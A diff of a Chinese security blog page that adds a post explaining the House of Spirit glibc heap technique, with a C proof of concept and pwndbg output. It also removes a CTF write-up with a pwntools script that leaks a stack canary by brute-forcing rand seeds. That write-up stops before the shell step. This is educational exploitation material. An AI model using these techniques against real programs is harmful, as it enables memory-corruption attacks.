@@ -156,6 +156,129 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/House%20Of%20Spirit-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/22/House%20Of%20Spirit-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Spirit-原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-01-22 22:54:03" itemprop="dateCreated datePublished" datetime="2022-01-22T22:54:03+08:00">2022-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-03 00:32:55" itemprop="dateModified" datetime="2022-03-03T00:32:55+08:00">2022-03-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>House Of Spirit 是 <code>Fastbin Attack</code> 中的一种，也是 <code>the Malloc Maleficarum</code> 中的一种技术</p>
+<p>通过free技术来达到任意地址读写的目的（<strong>WAA</strong>）：技术中利用free函数来释放一个原本属于栈中的一块地址（伪造为 fake chunk ），将地址free到堆的bin链中，然后实现对栈地址的读写 </p>
+<p>​        // 当然也可以不在栈中，任意可写的段都可以</p>
+<hr>
+<h2 id="Fastbin检查机制"><a href="#Fastbin检查机制" class="headerlink" title="Fastbin检查机制"></a>Fastbin检查机制</h2><ul>
+<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li>
+<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li>
+</ul>
+<p>主要是检查当前chunk的size，和下一个chunk的size</p>
+<h2 id="House-Of-Spirit-利用姿势"><a href="#House-Of-Spirit-利用姿势" class="headerlink" title="House Of Spirit 利用姿势"></a>House Of Spirit 利用姿势</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;<span class="comment">//fake_size</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>;<span class="comment">//fake_nextsize(可有可无)</span></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;fake_chunks: %p\n&quot;</span>,&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks: <span class="number">0x7fffffffdcc0</span></span><br><span class="line">malloc(<span class="number">0x30</span>): <span class="number">0x7fffffffdcc0</span></span><br><span class="line">malloc(<span class="number">0x30</span>): <span class="number">0x5555555592c0</span></span><br></pre></td></tr></table></figure>
+<p>可以发现：函数“free”把栈上的“fake_chunks”送入了“tcachebins”</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [<span class="number">1</span>]: <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>​        // 这里的“fake_chunks”被送入了“tcachebins”，如果是低libc版本就送入“fastbins”</p>
+<p>house of spirit 简单的来说就是 free 一个假的 fastbin 堆块，然后再下次 malloc 的时候就会返回该假堆块 </p>
+<p>利用条件：</p>
+<ul>
+<li>需要修改模块，不需要控制free模块的参数：申请到堆上，把目标地址写入修改模块的控制范围</li>
+<li>需要控制free模块的参数，不需要修改模块：申请到栈上，用目标地址覆盖返回地址</li>
+<li>在“计数器”后面存在可以控制的区域，同时修改模块也可以在此处写入内容（也可以获取现成的数字）</li>
+</ul>
+<h2 id="版本对-House-Of-Spirit-的影响"><a href="#版本对-House-Of-Spirit-的影响" class="headerlink" title="版本对 House Of Spirit 的影响"></a>版本对 House Of Spirit 的影响</h2><p>不同 libc 的版本“释放检查”不同，像 libc-2.23 就只有上文的两个检查，后续会尽量把不同版本的 House Of Spirit 都复现一遍，直到完全没法打为止</p>
+<p><strong>libc-2.23</strong></p>
+<p>上文提到的，基本的 free 检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查p的大小是否小于global_max_fast</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS </span></span><br><span class="line">        <span class="comment">//检查p物理相邻的堆块是否是top chunk</span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ) </span><br><span class="line">  <span class="comment">//检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">	     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+<p><strong>libc-2.27</strong></p>
+<p>多了一个检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>检查下一个 chunk 的 pre_size 是否为 NULL，一般在伪造 size 的时候多写一步就可以了</p>
+<p>后续版本都没有添加新的检查（最新测试到 libc-2.31）</p>
+<p><strong>注意</strong></p>
+<p>在64位的程序中：可以轻易实现 House Of Spirit（至少在 libc-2.31及其之前的版本是这样） </p>
+<p>但是在32位的程序中：只有在 libc-2.23 版本成功实现 House Of Spirit，其他版本均报错</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>():invalid pointer</span><br></pre></td></tr></table></figure>
+<p>看了源码，定位了报错的位置，但是还是不知道原因……</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1576,174 +1699,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/" class="post-title-link" itemprop="url">pwndbg搜索技巧+one_gadget</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-01-06 08:23:52 / Modified: 08:49:56" itemprop="dateCreated datePublished" datetime="2022-01-06T08:23:52+08:00">2022-01-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>7.6k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>pwndbg搜索技巧+one_gadget</strong></p>
-<p>这是某个CTF比赛上的题目</p>
-<p>记得当时在打比赛时死活搞不出来“__libc_start_main”的偏移量（其实我都已经在GDB中看见了），看国外某大佬的WP后学到了不少关于“pwndbg搜索”的知识</p>
-<p>通过这个题目我也纠正了不少概念上的误区，于是在此记录</p>
-<hr>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000070341.png" alt="1641000070341"> </p>
-<p>循环输入</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000121563.png" alt="1641000121563"> </p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000135559.png" alt="1641000135559"> </p>
-<p>64位，dynamically，全开</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000226315.png" alt="1641000226315">  </p>
-<p><strong>代码分析</strong></p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000431581.png" alt="1641000431581">  </p>
-<p>获取数据数到“buf”中</p>
-<p>sub_ACA：</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000694377.png" alt="1641000694377"> </p>
-<p>在s1中读入256字节（遇到“\n”就中断）</p>
-<p>小循环：</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000905974.png" alt="1641000905974"> </p>
-<p>如果前3个字节是”id “就把“v5”转换为整数并赋值给“v1”，否则就break</p>
-<p>大循环：</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001004738.png" alt="1641001004738"> </p>
-<p>如果前6字节是“create”就执行函数sub_BD1，否则就break</p>
-<p>sub_BD1：</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001295275.png" alt="1641001295275"> </p>
-<p>随机生成一段字符串</p>
-<p>特大循环：</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001361592.png" alt="1641001361592"> </p>
-<p>如果前4字节是“quit”则break结束程序</p>
-<p><strong>漏洞分析</strong></p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003509946.png" alt="1641003509946">  </p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001641478.png" alt="1641001641478"> </p>
-<p>这里就有数组越位和栈溢出</p>
-<p>没有system，没有“/bin/sh”</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647.png" alt="1641379976647"> </p>
-<p>“buf[v1]”并没有好好检查下标</p>
-<p><strong>入侵思路</strong></p>
-<p>首先考虑绕开PIE和Canary</p>
-<p>那么这么泄露地址呢？</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003528827.png" alt="1641003528827"> </p>
-<p>输出函数printf可以输出“s”的值，而“s”是用随机数拼凑出来的，而且有memset填充“0”，想控制printf根本不可能</p>
-<p>但是有一种邪门的方式可以泄露canary：</p>
-<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647-1641430195129.png" alt="1641379976647"> </p>
-<p>“buf[v1]”并没有好好检查下标，也就是说，程序会把任何栈上的数据给放入“sub_BD1”进行加密，如果我们对加密后的数据进行分析，说不定就可以还原加密值</p>
-<p>那么这里有两个问题需要解决：</p>
-<p>1.canary相对于“buf[0]”的偏移</p>
-<p>2.获取对应偏移的对应值</p>
-<p>第一个问题需要在pwndbg中看： </p>
-<p>在函数“sub_BD1”调用时，RAX中的值就是“buf[0]”（在ID那里输入的“0”）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0xf593</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0xf593</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] <span class="comment">/* &#x27;create&#x27; */</span></span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al <span class="comment">/* &#x27;&gt; &#x27; */</span></span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffddf0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc60</span> ◂— <span class="number">0xd68</span> <span class="comment">/* &#x27;h\r&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
-<p>发现其值为 <strong>“0xf593”</strong> ，用pwngdb查找这个字符串：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0xf593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78381</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78385</span> <span class="number">0x5fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78389</span> <span class="number">0x9ffff59105fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78395</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78399</span> <span class="number">0xf3fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f7839d</span> <span class="number">0xfff58ff3fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f87fe9</span> <span class="number">0xd400019d60fff593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdbfc</span> <span class="number">0xf593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdc76</span> <span class="number">0x86a89b009b7df593</span> </span><br></pre></td></tr></table></figure>
-<p>接着找寻canary的值：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary</span><br><span class="line">AT_RANDOM = <span class="number">0x7fffffffe149</span> <span class="meta"># points to (not masked) global canary value</span></span><br><span class="line">Canary    = <span class="number">0x959c7d572835fc00</span> (may be incorrect on != glibc)</span><br><span class="line">Found valid canaries on the stacks:</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd558</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffd5c8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdac8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb28</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb38</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdb98</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdc48</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
-<p>查找“0x959c7d572835fc00”（canary）的地址：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[anon_7ffff7fb1] <span class="number">0x7ffff7fb6568</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb3e8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffb458</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd558</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffd5c8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdac8</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb28</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb38</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdb98</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc48</span> <span class="number">0x959c7d572835fc00</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdcd8</span> <span class="number">0x959c7d572835fc00</span></span><br></pre></td></tr></table></figure>
-<p>现在我们找到了canary中出现的随机数的地址，还有“buf[0]”中随机数的地址</p>
-<p>按道理来说，两者相减就可以得到canary随机数相对于“buf[0]”的偏移了，但是我们却搜索到了多组数据，这是因为这些数据可能在随机数表中多次出现</p>
-<p>只有一次一次尝试，把离谱的排除了之后就得到偏移了（相当看脸）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdcd8</span> - <span class="number">0x7fffffffdc76</span> = <span class="number">98</span></span><br><span class="line"><span class="number">98</span> / <span class="number">2</span> = <span class="number">49</span>  <span class="comment">#数组buf的类型为‘int16’</span></span><br></pre></td></tr></table></figure>
-<p>第二个问题有一点麻烦：（先看一段代码）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>): <span class="comment">#循环少了匹配的几率小，循环多了匹配的时间长</span></span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
-<p>函数<strong>leak</strong>中的offset其实就是canary在随机数表中的偏移，对应偏移中存放的数据就是canary片段的值，这里我们可以用一个很骚的方式获取这个值</p>
-<p>我们直接把canary的偏移输入给程序，程序就会读取canary的值，并且用这个值来生成“32位”字符串，我们这里用循环<strong>“从 0 到 0xffff+1”</strong> 依次生成“32位”字符串，然后把“程序生成的”和“我们生成的”进行对比，如果可以匹配就证明canary的值就是对应的下标</p>
-<p>​        // 当然也有小概率会重复，多试几次就好了</p>
-<p>解决了canary就要考虑怎么获取shell的问题：</p>
-<p>首先程序开了PIE的，ROP基本上废了，需要泄露“__libc_start_main”</p>
